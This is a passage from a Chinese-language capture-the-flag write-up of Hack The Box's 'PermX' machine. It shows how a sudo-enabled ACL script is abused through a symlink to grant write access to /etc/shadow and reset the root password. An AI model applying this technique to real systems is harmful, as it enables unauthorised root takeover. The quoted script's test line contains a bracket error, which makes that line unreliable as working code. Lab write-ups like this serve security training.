![](https://img.trtyr.top/images/blog/Hack%20The%20Box%20PermX/PermX-25.png?imageMogr2/format/avif)

`/opt/acl.sh` 可访问

```shell
#!/bin/bash

if [ "$#" -ne 3 ]; then
    /usr/bin/echo "Usage: $0 user perm file"
    exit 1
fi

user="$1"
perm="$2"
target="$3"

if [[ "$target" != /home/mtz/* ); then
    /usr/bin/echo "Access denied."
    exit 1
fi

# Check if the path is a file
if [ ! -f "$target" ]; then
    /usr/bin/echo "Target must be a file."
    exit 1
fi

/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
```

脚本功能是在 `/home/mtz/` 下改权限。看一下 `/home/mtz` 下的权限

![](https://img.trtyr.top/images/blog/Hack%20The%20Box%20PermX/PermX-26.png?imageMogr2/format/avif)

哎？可以用软链接

![](https://img.trtyr.top/images/blog/Hack%20The%20Box%20PermX/PermX-27.png?imageMogr2/format/avif)

我们现在可以修改一个文件，那就修改 shadow 呗，重新生成一个密码

```shell
sudo /opt/acl.sh mtz rwx /home/mtz/root/etc/shadow
```
